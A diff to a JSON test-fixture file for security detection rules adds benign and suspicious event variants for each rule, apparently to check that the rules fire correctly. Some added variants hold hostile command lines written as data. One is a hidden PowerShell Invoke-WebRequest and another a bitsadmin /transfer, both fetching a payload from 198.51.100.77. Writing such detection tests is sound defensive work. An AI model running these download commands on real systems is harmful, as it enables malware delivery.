@@ -59,7 +59,16 @@
       "host": "WS-01",
       "service_name": "UpdaterSvc",
       "message": "A service changed state."
-    }
+    },
+    "match_overrides": [
+      {},
+      {
+        "image_path": "C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe"
+      },
+      {
+        "message": "A service was installed referencing rundll32.exe as the executable."
+      }
+    ]
   },
   {
     "rule_id": "SOCF-005",
@@ -80,7 +89,13 @@
       "actor": "alice",
       "task_name": "Updater",
       "message": "A scheduled task was updated."
-    }
+    },
+    "match_overrides": [
+      {},
+      {
+        "message": "A scheduled task was created referencing rundll32 in its description."
+      }
+    ]
   },
   {
     "rule_id": "SOCF-006",
@@ -123,7 +138,13 @@
       "actor": "admin01",
       "target_user": "svc-backup",
       "message": "A user account was deleted."
-    }
+    },
+    "match_overrides": [
+      {},
+      {
+        "message": "A new admin-style test account was created."
+      }
+    ]
   },
   {
     "rule_id": "SOCF-008",
@@ -146,7 +167,13 @@
       "target_user": "bob",
       "group_name": "Marketing",
       "message": "A member was added to a distribution group. Group: Marketing."
-    }
+    },
+    "match_overrides": [
+      {},
+      {
+        "event_id": 4756
+      }
+    ]
   },
   {
     "rule_id": "SOCF-009",
@@ -171,11 +198,21 @@
     "rule_id": "SOCF-010",
     "rule_file": "SOCF-010.yml",
     "match_overrides": [
-      {"username": "alice"},
-      {"username": "bob"},
-      {"username": "carol"},
-      {"username": "dave"},
-      {"username": "erin"}
+      {
+        "username": "alice"
+      },
+      {
+        "username": "bob"
+      },
+      {
+        "username": "carol"
+      },
+      {
+        "username": "dave"
+      },
+      {
+        "username": "erin"
+      }
     ],
     "match": {
       "timestamp": "2026-07-17T12:08:00Z",
@@ -216,7 +253,13 @@
       "process_name": "powershell.exe",
       "command_line": "powershell.exe Get-Service WinDefend",
       "message": "New process powershell.exe Get-Service WinDefend"
-    }
+    },
+    "match_overrides": [
+      {},
+      {
+        "command_line": "powershell.exe -NoP -W Hidden Invoke-WebRequest -Uri http://198.51.100.77/payload.ps1"
+      }
+    ]
   },
   {
     "rule_id": "SOCF-012",
@@ -241,7 +284,13 @@
       "image_path": "C:\\Windows\\System32\\svchost.exe",
       "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
       "message": "New process from System32."
-    }
+    },
+    "match_overrides": [
+      {},
+      {
+        "message": "New process launched from \\Users\\alice\\AppData\\Roaming\\ directory, unusual for this host."
+      }
+    ]
   },
   {
     "rule_id": "SOCF-023",
@@ -307,6 +356,19 @@
       "process_name": "certutil.exe",
       "command_line": "certutil.exe -hashfile file.exe SHA256",
       "message": "A new process has been created. New Process Name: certutil.exe."
-    }
+    },
+    "match_overrides": [
+      {},
+      {
+        "message": "A new process has been created referencing -urlcache in its arguments."
+      },
+      {
+        "command_line": "bitsadmin.exe /transfer myjob http://198.51.100.77/payload.exe C:\\Temp\\out.exe"
+      },
+      {
+        "command_line": "bitsadmin.exe /transfer myjob http://198.51.100.77/payload.exe C:\\Temp\\out.exe",
+        "message": "A new process has been created running bitsadmin /transfer."
+      }
+    ]
   }
 ]
